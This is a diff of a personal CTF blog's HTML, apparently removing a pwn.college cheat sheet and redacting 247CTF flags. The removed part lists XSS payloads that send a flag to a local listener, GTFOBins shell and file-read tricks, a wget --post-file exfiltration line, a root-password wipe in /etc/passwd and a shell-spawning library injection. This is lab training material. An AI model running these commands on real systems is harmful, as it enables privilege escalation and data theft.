-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Manual handling (checking Location header)</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%b&quot;</span> <span class="string">&quot;GET / HTTP/1.1\r\nHost: challenge.localhost:80\r\nConnection: close\r\n\r\n&quot;</span> | nc localhost 80</span><br><span class="line"></span><br><span class="line"><span class="comment"># Automated redirect following</span></span><br><span class="line">curl -L -X GET <span class="string">&quot;http://localhost/&quot;</span> -H <span class="string">&quot;Host: challenge.localhost:80&quot;</span></span><br></pre></td></tr></table></figure>
-<h3 id="client-side-redirection-xss-style-exfiltration">2.7 Client-Side
-Redirection &amp; XSS-style Exfiltration</h3>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Simple JS redirect</span></span><br><span class="line">echo <span class="string">&#x27;&lt;script&gt;window.location = &quot;/check&quot;;&lt;/script&gt;&#x27;</span> &gt; ~<span class="regexp">/public_html/</span>solve.<span class="property">html</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Data Exfiltration via URL</span></span><br><span class="line">echo <span class="string">&#x27;&lt;script src=&quot;/submit&quot;&gt;&lt;/script&gt;&lt;script&gt;window.location=&quot;http://localhost:1337/?stolen=&quot;+flag;&lt;/script&gt;&#x27;</span> &gt; ~<span class="regexp">/public_html/</span>solve.<span class="property">html</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Exfiltration using Fetch</span></span><br><span class="line">echo <span class="string">&#x27;&lt;script&gt;fetch(&quot;/gateway&quot;).then(r=&gt;r.text()).then(d=&gt;window.location=&quot;http://localhost:1337/?stolen=&quot;+d);&lt;/script&gt;&#x27;</span> &gt; ~<span class="regexp">/public_html/</span>solve.<span class="property">html</span></span><br></pre></td></tr></table></figure>
-<h2 id="program-misuse-gtfobins">3. Program Misuse (GTFOBins)</h2>
-<p>Techniques for reading restricted files (like <code>/flag</code>) via
-unexpected program behavior.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Compressed formats</span></span><br><span class="line">gzip -c /flag | gzip -d</span><br><span class="line">bzip2 -c /flag | bzip2 -d</span><br><span class="line">zip -c /flag | zip -d</span><br><span class="line">tar -cO /flag | tar -xO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Archive tools</span></span><br><span class="line">ar r pwned.a /flag &amp;&amp; ar p pwned.a</span><br><span class="line"><span class="built_in">echo</span> /flag | cpio -o</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shell/Execution wrappers</span></span><br><span class="line"><span class="built_in">env</span> /bin/sh -p</span><br><span class="line"><span class="built_in">nice</span> /bin/sh -p</span><br><span class="line"><span class="built_in">timeout</span> 0 /bin/sh -p</span><br><span class="line">setarch $(<span class="built_in">arch</span>) /bin/sh -p</span><br><span class="line">socat - <span class="string">&#x27;exec:/bin/sh -p,pty,ctty,raw,echo=0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Text processing / viewing</span></span><br><span class="line">find /flag -<span class="built_in">exec</span> <span class="built_in">cat</span> &#123;&#125; \;</span><br><span class="line">mawk <span class="string">&#x27;//&#x27;</span> /flag</span><br><span class="line">sed <span class="string">&#x27;&#x27;</span> /flag</span><br><span class="line">whiptail --textbox --scrolltext /flag 50 100</span><br><span class="line">ed /flag <span class="comment"># Use &#x27;,p&#x27; to print, &#x27;q&#x27; to quit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Language Interpreters</span></span><br><span class="line">perl -ne <span class="built_in">print</span> /flag</span><br><span class="line">python -c <span class="string">&#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;</span></span><br><span class="line">ruby -e <span class="string">&#x27;puts File.read(&quot;/flag&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Miscellaneous</span></span><br><span class="line"><span class="built_in">cp</span> /flag &gt; /dev/stdout</span><br><span class="line"><span class="built_in">date</span> -f /flag</span><br><span class="line">dmesg -rF /flag</span><br><span class="line"><span class="built_in">wc</span> --files0-from /flag</span><br><span class="line">gcc -x c -E /flag</span><br><span class="line">as @/flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Network tools</span></span><br><span class="line">nc -lp 1337 &amp; wget --post-file=/flag http://127.0.0.1:1337/</span><br></pre></td></tr></table></figure>
-<h3 id="privilege-escalation-tricks">3.1 Privilege Escalation
-Tricks</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Changing permissions/ownership</span></span><br><span class="line"><span class="built_in">chown</span> $(<span class="built_in">id</span> -un):$(<span class="built_in">id</span> -gn) /flag</span><br><span class="line"><span class="built_in">chmod</span> 777 /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shadowing root password</span></span><br><span class="line"><span class="built_in">cp</span> /etc/passwd ./hack_passwd</span><br><span class="line">sed -i <span class="string">&#x27;s/^root:x:/root::/&#x27;</span> ./hack_passwd</span><br><span class="line"><span class="built_in">mv</span> ./hack_passwd /etc/passwd</span><br><span class="line">su root</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shared Library Injection</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">void C_GetFunctionList() &#123;&#125;</span></span><br><span class="line"><span class="string">void __attribute__((constructor)) init() &#123;</span></span><br><span class="line"><span class="string">    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;, NULL);</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> | gcc -w -fPIC -shared -o lib.so -x c -</span><br><span class="line">/challenge/ssh-keygen -D ./lib.so</span><br></pre></td></tr></table></figure>
-<h2 id="sql-injection-basics">4. SQL Injection Basics</h2>
-<h3 id="simple-selects">4.1 Simple Selects</h3>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Select all logs</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logs;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Filter by ID/Tag</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> entries <span class="keyword">WHERE</span> flag_tag <span class="operator">=</span> <span class="number">1337</span>;</span><br><span class="line"><span class="keyword">SELECT</span> resource <span class="keyword">FROM</span> flags <span class="keyword">WHERE</span> flag_tag <span class="operator">!=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
-<h3 id="pattern-matching-string-manipulation">4.2 Pattern Matching &amp;
-String Manipulation</h3>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- LIKE operator</span></span><br><span class="line"><span class="keyword">SELECT</span> detail <span class="keyword">FROM</span> payloads <span class="keyword">WHERE</span> flag_tag <span class="keyword">LIKE</span> &quot;yep&quot;;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Substring matching</span></span><br><span class="line"><span class="keyword">SELECT</span> detail <span class="keyword">FROM</span> items <span class="keyword">WHERE</span> substr(detail, <span class="number">1</span>, <span class="number">3</span>) <span class="operator">=</span> <span class="string">&#x27;pwn&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Complex substring extraction (brute-forcing length)</span></span><br><span class="line"><span class="keyword">SELECT</span> substr(secret, <span class="number">1</span>, <span class="number">5</span>), substr(secret, <span class="number">6</span>, <span class="number">5</span>) <span class="keyword">FROM</span> items;</span><br></pre></td></tr></table></figure>
-<h3 id="database-schema-exploration">4.3 Database Schema
-Exploration</h3>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- List tables in SQLite</span></span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> sqlite_master <span class="keyword">WHERE</span> type<span class="operator">=</span><span class="string">&#x27;table&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Querying found tables</span></span><br><span class="line"><span class="keyword">SELECT</span> flag <span class="keyword">FROM</span> UgRKNxaq;</span><br></pre></td></tr></table></figure>
-
+          Here's something encrypted, password is required to continue reading.
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/wp/PwnCollege/PwnCollege-basic/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -784,7 +635,7 @@ Exploration</h3>
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-09 10:48:26" itemprop="dateModified" datetime="2026-09-09T10:48:26+08:00">2026-09-09</time>
+      <time title="Modified: 2026-09-23 15:01:05" itemprop="dateModified" datetime="2026-09-23T15:01:05+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -839,8 +690,8 @@ character in sequence and appending it to the previously discovered
 string.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bcrypt</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">hashes = [</span><br><span class="line">    <span class="string">b&quot;$2b$12$uAfq9EI1EoIC316VgA3azeOyogkKzG4zz2kF8M.l.D4h4nT4WsidK&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$NmhDm/LZzjanlv6xuHCsVe8JJNlvEb3uYUEQ03abPIlCuTE6qtrT.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$8OhK6ZPoSuBujRxR3pz4g.vp6LvTqJe/NJZZHTHtOPkdIbDb1GDKS&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$PhFiPd28yDeXdZaJfUDjTOiAUQtpBJ2AjD5pFIG7CtUXQtWECGpre&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$DfQJicmUWZQ0EVGKxdQEN.yCj3s4o6GyMraqt514d3DRkAqH8PYq6&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$JikQohCsuFN6DO7q9ZHCTeHuzL3/Hb3diMYJsUGgAI4AH64x9jtyO&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$4C2jJ0QxCKdqyrBTIhqEGeeq1IMOZJs7DllwqtMWbp.rM7BPsbDwG&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$FI45z3VbyCC4Bb5rVJsLb./Od6aSnT8tHIPkwmZCgGNNrXwpJqkO6&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$tFkj/QdzBVsk8XjjjH91eefYY/lx6YX/4lnB9T/GKSIvpmx7mEEG2&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$Il.BDj/qxIkgROEZN4/Te.QJawuPW18MHU1hVQzNIC9SW7H.Mo9.2&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$3UOGifrFe0iGGh4sSWx1JeB919LDApovzwbYIQqniIFVE3/mgEFkW&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$5voYYJHxGJVy3ITneNhk/.XbcfOKDDnMHiS2CTri0ncFQ/jUgND.e&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$cDvS2AqrJ72gvUP5wSnjSOqdsFIKcsGI863NxXgdedYzMV0YzOZmW&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$pIcJfpN7L0SGQtA/4bcX.ewqrSkeUzCeq4mrjHCzhwQKB2LTc4tJe&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$4xjImCcvXpgG.WFwjlryEONm4gFy3/O2VSCsrL1lX38f0XDPKc6Hm&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$gIWlY5GubfJ1kIhMEO9GnuTbalD8aPc6ECdNIq.4Vjx6S38nKLG8S&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$9UpsAlXYVpPw4B93u2WBm.Ve0JMqdkQ0wxvuAPqnXmtzjmvXm0hea&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$QqTL8meoLdWMnipKwuRoC.d9ei6TU2ev1Ggu0VsC2gLGMfF7QWOPi&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$8M.Z95IrSP64adu2LiOhzO4vhtmfjBx45Pp.FJsq4Tqe/t5GaPeA2&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$GNWfLovpvpMcoK89QdZzt.u8XibRtwo0aFFnUSBcqs0SjocL6hgVS&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$mLzTYglkEg3iqusfz8lOOuH548ezA.mgfr8pYI7cd3ozU8aPJBhAC&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$6GTg.qAyDUQorM1BwcIXRe7Ab.L3ZXqJhI0xg2G.OtCVf5W1BH7zu&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$Nxd1aKxcgV4s51dN5nc2puAtG8J6asT8vcvB0kfWhcfYp868nza7.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$Z2/4n8JEXI19ZFL7A4ojEOiSbfAeV3KZj5Nc0.Uu6sXG6KHvtPCLi&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$AEiJfo2eTPnTCU.NL2jJeOifcw/TOAZaOLjMAPKEdfJmgdQy/WoYC&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$8pA4oDi3uovODvOuf2GrteqltIOhDUH/AI07H1NrvCoA5AvL9vKJe&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$Kke80penOJ8l7/EBoDZCWufdwdWju/Twb6.9DSm498.I922qNBfBK&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$xOcqWzPSMN3VgbsmEmZbYe98NBK1Qxpp6fAZNYCEiU/Lw5vsbIOz.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$OnXeQsiQyBpIZzciVGSkUuBwcr62OoirL8Ebb9QczH7AAFdIsrbxi&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$3c8V9ss5ATsQkkz0ZUg2T.x0qCBszvuetJPX.vm9XPgsGBwhedfhy&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$xVrrb1qPs3mHX2kp6vo10e8zsUqDxXxlmptJnFBT/5YVDeSGAJsty&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$BA5vnPd.oxWN4BEn6PybEeXgWYrX02k9rHXLnDAiDedUilCuiv2jy&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$7p6s4NoKXsjqD/0wnuO2b.2ux70dPNcN5wBYccuzz8vm1ZZ9iPPLu&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$oXuFS3O5Td3knq2gRyf5XOhwj1.IYOWQ9fSvGY05YU0MwizIm18Ru&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$l3wvb/fiYbkzoqWv1.ulMuQPTn6xP67D0/YkjNzwJi1bK30qJAZWu&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$3eFpVZJh6TfrnbE.hdfitu8UiqLei7u2vEjFPecu6O5FqNqyOYOs.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$XtrkQGAyvRcIdCtW4AK9/.9oSlP2rAwE.KNk5f2sKuyhhDNzIAvzC&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$zrsIpC4WnPVjcCRODlRXT.IDPIZwBEP2VwTv.q5/DIfCpdD44zoam&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$Lr3UiwLPab6yEw.TERhNAu1/qlQelYuqmF/Wcg3UtrzslAzrf3/di&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$RtpdIcXU8hH8pnDGQHCupu5l2mw872X6SFamb20w9A.sieVEk7Xba&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">charset = string.printable.strip()</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, h <span class="keyword">in</span> <span class="built_in">enumerate</span>(hashes):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Cracking index <span class="subst">&#123;i:2d&#125;</span>... &quot;</span>, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">if</span> bcrypt.checkpw((flag + c).encode(), h):</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;c&#125;</span> | Current: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed to crack.&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n[+] Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
 <h3 id="result">Result</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line">[+] 247CTF&#123;********************************&#125;</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{167d16d4a0d05da530c941dd23ff0238}</span></span>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line">[+] 247CTF&#123;&lt;flag-redacted&gt;&#125;</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{<flag-redacted>}</span></span>
 
       
     </div>
@@ -903,7 +754,7 @@ string.</p>
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-09 10:47:51" itemprop="dateModified" datetime="2026-09-09T10:47:51+08:00">2026-09-09</time>
+      <time title="Modified: 2026-09-23 15:01:05" itemprop="dateModified" datetime="2026-09-23T15:01:05+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1107,10 +958,10 @@ class="math inline">\(n_i\)</span> total API calls:</p>
 \right\rfloor, \qquad r_i = n_i \bmod 13\]</span></p>
 <p><span class="math display">\[\text{password}[i] \equiv q_i \cdot S +
 P(r_i) \pmod{126}\]</span></p>
-<p>The flag format <code>247CTF&#123;...&#125;</code> gives us 8 known characters
-for free. Three of them — blocks 2, 3, 6 — share the same remainder
-<span class="math inline">\(r = 9\)</span>: same position in the
-error-code cycle, different lap counts. Shared <span
+<p>The flag format <code>247CTF&#123;&lt;flag-redacted&gt;&#125;</code> gives us 8
+known characters for free. Three of them — blocks 2, 3, 6 — share the
+same remainder <span class="math inline">\(r = 9\)</span>: same position
+in the error-code cycle, different lap counts. Shared <span
 class="math inline">\(P(9)\)</span> cancels on subtraction.</p>
 <p>Blocks 2, 3, 6 correspond to <code>7</code> (ASCII <span
 class="math inline">\(55\)</span>, <span class="math inline">\(q =
@@ -1278,9 +1129,9 @@ directly:</p>
 </tr>
 </tbody>
 </table>
-<p>All 40 characters land in the valid charset — <code>247CTF&#123;</code>
-prefix, <code>[0-9a-f]</code> hex body, <code>&#125;</code> suffix —
-confirming the solution without ever running the binary.</p>
+<p>All 40 characters land in the valid charset —
+<code>247CTF&#123;&lt;flag-redacted&gt;&#125;</code> suffix — confirming the
+solution without ever running the binary.</p>
 <h3 id="character-by-character-breakdown">Character-by-Character
 Breakdown</h3>
 <table>
@@ -1630,7 +1481,7 @@ return different error codes under a debugger, making dynamic analysis a
 trap. The algebraic approach sidesteps this entirely by reasoning at the
 mathematical level, independent of the Windows runtime.</li>
 </ul>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{e0fb1f6d98d7da90d7c5cef27c2f4798}</span></span>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{<flag-redacted>}</span></span>
 
       
     </div>
@@ -1693,7 +1544,7 @@ mathematical level, independent of the Windows runtime.</li>
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-09 10:48:26" itemprop="dateModified" datetime="2026-09-09T10:48:26+08:00">2026-09-09</time>
+      <time title="Modified: 2026-09-23 15:01:05" itemprop="dateModified" datetime="2026-09-23T15:01:05+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1756,7 +1607,7 @@ input.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ python solve.py</span><br><span class="line">wgIdWOS6Df9sCzAfiK</span><br></pre></td></tr></table></figure>
 <p>Connecting to the server with the found password:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">❯ nc 0c4c28058a1f7a2f.247ctf.com 50230</span><br><span class="line">Enter a valid password:</span><br><span class="line">wgIdWOS6Df9sCzAfiK</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{a3bbb9d2e648841d99e1cf4535a92945}</span></span>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{<flag-redacted>}</span></span>
 <h2 id="references">References</h2>
 <ul>
 <li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2pha2VzcHJpbmdlci9hbmdyX2N0Zi90cmVlL21hc3Rlci9zb2x1dGlvbnMvMDFfYW5ncl9hdm9pZA==">angr_ctf
@@ -1824,7 +1675,7 @@ learn - jakespringer<i class="fa fa-external-link-alt"></i></span></li>
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-23 14:59:49" itemprop="dateModified" datetime="2026-09-23T14:59:49+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1860,20 +1711,15 @@ learn - jakespringer<i class="fa fa-external-link-alt"></i></span></li>
     
     
     <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Your task is to find the first two primes above 1,000,000 whose digit
-sum is also prime.
-你的任务是找到大于1,000,000的前两个质数，其各位数字之和也是质数。</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>Find the first two primes greater than 1,000,000 where the sum of
-their digits is also prime. Concatenate them as the answer.</p>
-<h3 id="solution">Solution</h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> n &gt; <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">all</span>(n % i != <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(n**<span class="number">0.5</span>) + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p = <span class="number">1000000</span></span><br><span class="line">found = []</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(found) &lt; <span class="number">2</span>:</span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> is_prime(p) <span class="keyword">and</span> is_prime(<span class="built_in">sum</span>(<span class="built_in">int</span>(d) <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">str</span>(p))):</span><br><span class="line">        found.append(p)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;found[<span class="number">0</span>]&#125;</span><span class="subst">&#123;found[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 10000331000037</span></span><br></pre></td></tr></table></figure>
-<p>The first two primes are 1000033 and 1000037. Their digit sums are
-1+0+0+0+0+3+3 = 7 (prime) and 1+0+0+0+0+3+7 = 11 (prime). Concatenated:
-10000331000037.</p>
-
+          Here's something encrypted, password is required to continue reading.
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/wp/WeChall/wechall-prime-factory/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1935,7 +1781,7 @@ their digits is also prime. Concatenate them as the answer.</p>
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-15 10:33:36" itemprop="dateModified" datetime="2026-09-15T10:33:36+08:00">2026-09-15</time>
+      <time title="Modified: 2026-09-23 14:59:49" itemprop="dateModified" datetime="2026-09-23T14:59:49+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1971,20 +1817,15 @@ their digits is also prime. Concatenate them as the answer.</p>
     
     
     <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Your task is to decode the following: 你的任务是解码以下内容:</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>Given a URL-encoded string:</p>
